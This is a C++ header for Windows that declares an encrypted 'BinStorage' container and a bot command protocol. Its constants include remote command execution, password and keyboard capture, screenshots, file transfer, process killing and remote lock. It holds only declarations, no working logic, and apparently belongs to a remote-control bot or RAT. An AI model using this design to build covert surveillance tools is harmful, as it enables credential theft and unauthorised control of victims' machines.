#ifndef __BIN_STORAGE_H
#define __BIN_STORAGE_H

#include <Windows.h>

namespace BinStorage
{
	#pragma pack(push, 1)

	struct STORAGE
	{
		STORAGE()
		{
			memset(this, 0, sizeof(STORAGE));
			this->size = sizeof(STORAGE);
		}
		
		BYTE randData[20];  //
		DWORD size;         //
		DWORD flags;        //
		DWORD count;        //
		BYTE md5Hash[16];	//
	};
	
	
	typedef struct
	{
		DWORD id;			//
		DWORD flags;		//
		DWORD size;			//
		DWORD realSize;		//
	}ITEM;
	
	#pragma pack(pop)
	
	bool AddItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize);
	bool AddItem(STORAGE **binStorage, DWORD id, DWORD flags, DWORD dwData);
	
	void Encrypt(const char *key, void *buffer, DWORD size);

	void Decrypt(const char *key, void *buffer, DWORD size);
	
	void InitKey(const char *key);
	
	LPBYTE Pack(STORAGE *binStorage, DWORD &dwSize);

	bool CheckHash(STORAGE *binStorage);
	ITEM *GetNextItem(const STORAGE *binStorage, ITEM *curItem);
	BinStorage::ITEM *GetItem(const STORAGE *binStorage, DWORD id = 0);
	LPTSTR GetItemData(const STORAGE *binStorage, DWORD id = 0);
	DWORD GetItemCount(const STORAGE *binStorage);

	LPTSTR GetItemText(const ITEM *curItem);

	INT ElfHash(LPBYTE pBuf, DWORD size);

	#define BINSTORAGE_MAX_SIZE (10 * 1024 * 1024) //WININET_MAXBYTES_TO_MEM
	
	#define BOT_EVENT_ID		1001
	#define BOT_CLIENT_ID		1002
	#define BOT_IP_IN			1003
	#define BOT_TYPE			1004
	#define BOT_REQUEST			1005
	#define BOT_RESPONSE		1006
	#define BOT_RESPONSE_RET	1007
	#define BOT_HOSTNAME		1008
	#define BOT_DEVICE_SERIAL	1009
	#define BOT_COMMENT			1010
	#define BOT_VERSION			1011
	

	#define BOT_TYPE_DIR				1
	#define BOT_TYPE_CMD				2
	#define BOT_TYPE_VERSION			3
	#define BOT_TYPE_PASSWORD			4
	#define BOT_TYPE_FILE_TO_REMOTE		5
	#define BOT_TYPE_FILE_FROM_REMOTE	6
	#define BOT_TYPE_SCREEN				7
	#define BOT_TYPE_PROCESS			8
	#define BOT_TYPE_SERVICE			9
	#define BOT_TYPE_KEYBOARD			10
	#define BOT_TYPE_NETWORK			11
	#define BOT_TYPE_SHUTDOWN			12
	#define BOT_TYPE_RESTART			13
	#define BOT_TYPE_LOCK				14
	#define BOT_TYPE_KILL_PROCESS		15
	#define BOT_TYPE_UPDATE_CLIENT_LOCK_INFO		16
	#define BOT_TYPE_UNLOCK				17
	#define BOT_TYPE_SET_LOCK_AUTO		18
	#define BOT_TYPE_LOGOFF				19

	#define BOT_TYPE_USB_CONFIG			25
	#define BOT_TYPE_UPGRADE			26

	#define RESPONSE_RET_NOT_PROCESS	0
	#define RESPONSE_RET_SUCCESS		1
	#define RESPONSE_RET_FAILED			2
	#define RESPONSE_RET_IMPLEMENT		3


	#define BOT_REQUEST_TYPE			2000

	// Get Online Client                                                                                              
//	#define REQUEST_TYPE_MANAGE_GET_LIST		1
	// Send Request & Get Response
	#define REQUEST_TYPE_MANAGE_REQUEST			2
	// Update Online Status & Get Manage Request
	#define REQUEST_TYPE_CLIENT_REQUEST			3
	// Send Response
	#define REQUEST_TYPE_CLIENT_RESULT			4
	// Send Response async
	#define REQUEST_TYPE_CLIENT_RESULT_ASYNC	5
	// Get Response Async                                                                                             
	#define REQUEST_TYPE_MANAGE_REQUEST_ASYNC	6
	// Get File Id                                                                                                    
	#define REQUEST_TYPE_GET_FILE_ID		    7
	// Get Upload/Download File Info
	#define REQUEST_TYPE_GET_FILE_UPDOWN_INFO   8
	// Get Client Id 
	#define REQUEST_TYPE_GET_CLIENT_ID			9
}
#endif
